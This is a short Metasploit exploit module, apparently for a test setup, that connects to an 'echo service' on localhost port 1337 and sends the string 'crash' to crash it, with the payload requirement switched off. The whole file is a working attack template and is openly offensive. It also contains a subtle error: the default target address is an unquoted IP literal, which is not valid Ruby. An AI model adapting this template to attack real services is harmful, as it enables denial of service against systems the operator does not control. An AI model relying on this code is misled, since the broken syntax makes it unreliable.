class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Echo Crash Test Exploit',
      'Description'    => %q{
        Connects to a vulnerable echo service and triggers a crash by sending a special input.
      },
      'Author'         => [ 'RemoTest' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,       # Required to suppress payload compatibility error
      'Payload'        => {},             # Disable payload requirement
      'Targets'        => [ [ 'Automatic', {} ] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2025-05-16'
    ))

    register_options([
      Opt::RHOST(127.0.0.1),
      Opt::RPORT(1337)
    ])
  end

  def exploit
    connect
    print_status("Sending crash payload to #{rhost}:#{rport}")
    sock.put("crash\n")
    disconnect
  end
end
